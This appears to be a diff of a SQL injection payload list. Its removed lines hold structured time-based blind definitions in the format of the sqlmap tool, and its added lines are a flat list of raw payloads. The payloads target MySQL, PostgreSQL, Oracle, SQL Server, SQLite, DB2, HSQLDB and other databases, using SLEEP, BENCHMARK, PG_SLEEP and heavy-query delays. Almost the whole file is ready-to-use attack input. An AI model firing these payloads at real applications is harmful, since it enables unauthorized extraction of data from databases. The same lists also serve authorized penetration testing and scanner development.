+OR 35=(CASE WHEN (51) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 56 END)
+OR 21=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
+AND 73=(SELECT COUNT(fuzzBits('054VkHdTF', 0.001)) FROM numbers(if((7), 1000000, 1)))
+AND 59=(SELECT COUNT(fuzzBits('I9k5Iom0z', 0.001)) FROM numbers(1000000))
+OR 73=(SELECT COUNT(fuzzBits('nWgdjlJza', 0.001)) FROM numbers(if((3), 1000000, 1)))
+OR 56=(SELECT COUNT(fuzzBits('CmvcdPPJd', 0.001)) FROM numbers(1000000))
+PROCEDURE ANALYSE(EXTRACTVALUE(59,CONCAT('\',(IF((35),BENCHMARK(88000000,MD5('diB0u1ieT')),32)))),1)
+PROCEDURE ANALYSE(EXTRACTVALUE(10,CONCAT('\',(BENCHMARK(67000000,MD5('mOiXZodEa'))))),1)
+PROCEDURE ANALYSE(EXTRACTVALUE(70,CONCAT('\',(IF((33),BENCHMARK(48000000,MD5('MEIsQuHE5')),31)))),1)
+PROCEDURE ANALYSE(EXTRACTVALUE(57,CONCAT('\',(BENCHMARK(99000000,MD5('KYwEk9Ies'))))),1)
+(CASE WHEN (64) THEN SLEEP(61) ELSE 6 END)
+(CASE WHEN (90=40) THEN SLEEP(19) ELSE 90 END)
+(SELECT 27 FROM (SELECT(SLEEP(24-(IF(99,0,86)))))oXsqgNl0b)
+(SELECT 81 FROM (SELECT(SLEEP(27)))O1eOP3ElC)
+(CASE WHEN (39) THEN (SELECT BENCHMARK(56000000,MD5('gzqR7J4kN'))) ELSE 96)
+(CASE WHEN (43=20) THEN (SELECT BENCHMARK(28000000,MD5('aYa37nfBp'))) ELSE 4)
+IF((68),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),64)
+(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
+(44 AND SLEEP(6))
+(31=63 AND SLEEP(37))
+ELT(20,SLEEP(67))
+ELT(94=88,SLEEP(31))
+MAKE_SET(85,SLEEP(60))
+MAKE_SET(21=30,SLEEP(66))
+(CASE WHEN (69) THEN (SELECT 33 FROM PG_SLEEP(92)) ELSE 92 END)
+(SELECT 53 FROM PG_SLEEP(42))
+(CASE WHEN (99) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,89000000)) ELSE 91 END)
+(SELECT COUNT(*) FROM GENERATE_SERIES(1,74000000))
+(SELECT (CASE WHEN (59) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 53 END))
+(SELECT (CASE WHEN (15=4) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 66 END))
+BEGIN IF (40) THEN DBMS_LOCK.SLEEP(36)
  ELSE DBMS_LOCK.SLEEP(0)
  END IF
  END
 
-request
-payload BEGIN IF (7=42) THEN DBMS_LOCK.SLEEP(97)
+BEGIN IF (7=42) THEN DBMS_LOCK.SLEEP(97)
  ELSE DBMS_LOCK.SLEEP(0)
  END IF
  END
-
-response
-time 36
-details
-dbms Oracle
-title Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)
-stype 5
-level 3
-risk 1
-clause 1,3,9
-where 3
-vector (SELECT (CASE WHEN (4) THEN DBMS_PIPE.RECEIVE_MESSAGE('LaC8WdWWj',68) ELSE 65 END) FROM DUAL)
-request
-payload (SELECT (CASE WHEN (60=5) THEN DBMS_PIPE.RECEIVE_MESSAGE('uBNWblPZt',75) ELSE 77 END) FROM DUAL)
-response
-time 86
-details
-dbms Oracle
-title Oracle time-based blind - Parameter replace (heavy queries)
-stype 5
-level 4
-risk 2
-clause 1,3,9
-where 3
-vector (SELECT (CASE WHEN (21) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 58 END) FROM DUAL)
-request
-payload (SELECT (CASE WHEN (75=12) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 91 END) FROM DUAL)
-response
-time [DELAYED]
-details
-dbms Oracle
-title SQLite > 2.0 time-based blind - Parameter replace (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 3
-vector (SELECT (CASE WHEN (60) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(000000000/2))))) ELSE 23 END))
-request
-payload (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2200000000/2)))))
-response
-time [DELAYED]
-details
-dbms SQLite
-dbms_version > 2.0
-title Firebird time-based blind - Parameter replace (heavy query)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 3
-vector IIF((27),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),90)
-request
-payload (SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
-response
-time [DELAYED]
-details
-dbms Firebird
-dbms_version >= 2.0
-title SAP MaxDB time-based blind - Parameter replace (heavy query)
-stype 5
-level 5
-risk 2
-clause 1,3,9
-where 3
-vector (SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (13)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (27)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (48)) AS T3)
-request
-payload (SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
-response
-time [DELAYED]
-details
-dbms SAP MaxDB
-title IBM DB2 time-based blind - Parameter replace (heavy query)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 3
-vector (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (93))
-request
-payload (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
-response
-time [DELAYED]
-details
-dbms IBM DB2
-title HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 3
-vector (SELECT (CASE WHEN (31) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(65),0),2200000000),NULL) ELSE 'tIgcjeHnt' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
-request
-payload (SELECT (CASE WHEN (13=16) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(13),0),6700000000),NULL) ELSE 'ohIPvUSH3' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
-response
-time 25
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 3
-vector (SELECT (CASE WHEN (2) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),5000000000),NULL) ELSE 'MaOeKiYIh' END) FROM (VALUES(0)))
-request
-payload (SELECT (CASE WHEN (0=100) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),7400000000),NULL) ELSE '7cfR7Jdx8' END) FROM (VALUES(0)))
-response
-time 21
-details
-dbms HSQLDB
-dbms_version > 2.0
-title Informix time-based blind - Parameter replace (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 3
-vector (CASE WHEN (60) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 44 END)
-request
-payload (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
-response
-time [DELAYED]
-details
-dbms Informix
-title MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause
-stype 5
-level 3
-risk 1
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (21) THEN SLEEP(62) ELSE 60 END))
-request
-payload ,(SELECT (CASE WHEN (17=45) THEN SLEEP(79) ELSE 8 END))
-response
-time 37
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)
-stype 5
-level 4
-risk 2
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (60) THEN (SELECT BENCHMARK(51000000,MD5('nZgPQ39CT'))) ELSE 48*(SELECT 73 FROM mysql.db) END))
-request
-payload ,(SELECT (CASE WHEN (33=87) THEN (SELECT BENCHMARK(74000000,MD5('hnv4OxRJj'))) ELSE 33*(SELECT 9 FROM mysql.db) END))
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version < 5.0.12
-title PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause
-stype 5
-level 3
-risk 1
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (41) THEN (SELECT 32 FROM PG_SLEEP(89)) ELSE 1/(SELECT 0) END))
-request
-payload ,(SELECT (CASE WHEN (1=95) THEN (SELECT 55 FROM PG_SLEEP(44)) ELSE 1/(SELECT 0) END))
-response
-time 74
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)
-stype 5
-level 4
-risk 2
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (19) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000)) ELSE 1/(SELECT 0) END))
-request
-payload ,(SELECT (CASE WHEN (42=65) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,29000000)) ELSE 1/(SELECT 0) END))
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)
-stype 5
-level 4
-risk 2
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (89) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 9*(SELECT 34 UNION ALL SELECT 30) END))
-request
-payload ,(SELECT (CASE WHEN (89=27) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 33*(SELECT 24 UNION ALL SELECT 73) END))
-response
-time [DELAYED]
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)
-stype 5
-level 3
-risk 1
-clause 2,3
-where 1
-vector ,(BEGIN IF (91) THEN DBMS_LOCK.SLEEP(36)
+(SELECT (CASE WHEN (4) THEN DBMS_PIPE.RECEIVE_MESSAGE('LaC8WdWWj',68) ELSE 65 END) FROM DUAL)
+(SELECT (CASE WHEN (60=5) THEN DBMS_PIPE.RECEIVE_MESSAGE('uBNWblPZt',75) ELSE 77 END) FROM DUAL)
+(SELECT (CASE WHEN (21) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 58 END) FROM DUAL)
+(SELECT (CASE WHEN (75=12) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 91 END) FROM DUAL)
+(SELECT (CASE WHEN (60) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(000000000/2))))) ELSE 23 END))
+(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2200000000/2)))))
+IIF((27),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),90)
+(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
+(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (13)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (27)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (48)) AS T3)
+(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
+(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (93))
+(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
+(SELECT (CASE WHEN (31) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(65),0),2200000000),NULL) ELSE 'tIgcjeHnt' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
+(SELECT (CASE WHEN (13=16) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(13),0),6700000000),NULL) ELSE 'ohIPvUSH3' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
+(SELECT (CASE WHEN (2) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),5000000000),NULL) ELSE 'MaOeKiYIh' END) FROM (VALUES(0)))
+(SELECT (CASE WHEN (0=100) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),7400000000),NULL) ELSE '7cfR7Jdx8' END) FROM (VALUES(0)))
+(CASE WHEN (60) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 44 END)
+(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
+(SELECT (CASE WHEN (21) THEN SLEEP(62) ELSE 60 END))
+(SELECT (CASE WHEN (17=45) THEN SLEEP(79) ELSE 8 END))
+(SELECT (CASE WHEN (60) THEN (SELECT BENCHMARK(51000000,MD5('nZgPQ39CT'))) ELSE 48*(SELECT 73 FROM mysql.db) END))
+(SELECT (CASE WHEN (33=87) THEN (SELECT BENCHMARK(74000000,MD5('hnv4OxRJj'))) ELSE 33*(SELECT 9 FROM mysql.db) END))
+(SELECT (CASE WHEN (41) THEN (SELECT 32 FROM PG_SLEEP(89)) ELSE 1/(SELECT 0) END))
+(SELECT (CASE WHEN (1=95) THEN (SELECT 55 FROM PG_SLEEP(44)) ELSE 1/(SELECT 0) END))
+(SELECT (CASE WHEN (19) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000)) ELSE 1/(SELECT 0) END))
+(SELECT (CASE WHEN (42=65) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,29000000)) ELSE 1/(SELECT 0) END))
+(SELECT (CASE WHEN (89) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 9*(SELECT 34 UNION ALL SELECT 30) END))
+(SELECT (CASE WHEN (89=27) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 33*(SELECT 24 UNION ALL SELECT 73) END))
+(BEGIN IF (1) THEN DBMS_LOCK.SLEEP(36)
  ELSE DBMS_LOCK.SLEEP(0)
  END IF
  END
 )
-request
-payload ,(BEGIN IF (1=0) THEN DBMS_LOCK.SLEEP(36)
+(BEGIN IF (1=1) THEN DBMS_LOCK.SLEEP(36)
  ELSE DBMS_LOCK.SLEEP(0)
  END IF
  END
 )
-response
-time 96
-details
-dbms Oracle
-title Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)
-stype 5
-level 3
-risk 1
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (34) THEN DBMS_PIPE.RECEIVE_MESSAGE('4GIgk3yWA',48) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
-request
-payload ,(SELECT (CASE WHEN (48=3) THEN DBMS_PIPE.RECEIVE_MESSAGE('EskgtGlpE',82) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
-response
-time 27
-details
-dbms Oracle
-title Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)
-stype 5
-level 4
-risk 2
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (35) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
-request
-payload ,(SELECT (CASE WHEN (23=48) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
-response
-time [DELAYED]
-details
-dbms Oracle
-title HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)
-stype 5
-level 4
-risk 2
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (28) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(57),0),2800000000),NULL))) ELSE 24/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
-request
-payload ,(SELECT (CASE WHEN (39=15) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(13),0),6200000000),NULL))) ELSE 61/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
-comment --
-response
-time [DELAYED]
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)
-stype 5
-level 4
-risk 2
-clause 2,3
-where 1
-vector ,(SELECT (CASE WHEN (17) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),3800000000),NULL))) ELSE 66/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
-request
-payload ,(SELECT (CASE WHEN (16=49) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),000000000),NULL))) ELSE 93/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
-response
-time [DELAYED]
-details
-dbms HSQLDB
-dbms_version > 2.0
+(SELECT (CASE WHEN (34) THEN DBMS_PIPE.RECEIVE_MESSAGE('4GIgk3yWA',48) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
+(SELECT (CASE WHEN (48=3) THEN DBMS_PIPE.RECEIVE_MESSAGE('EskgtGlpE',82) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
+(SELECT (CASE WHEN (35) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
+(SELECT (CASE WHEN (23=48) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
+(SELECT (CASE WHEN (28) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(57),0),2800000000),NULL))) ELSE 24/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
+(SELECT (CASE WHEN (39=15) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(13),0),6200000000),NULL))) ELSE 61/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
+(SELECT (CASE WHEN (17) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),3800000000),NULL))) ELSE 66/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
+(SELECT (CASE WHEN (16=49) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),000000000),NULL))) ELSE 93/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
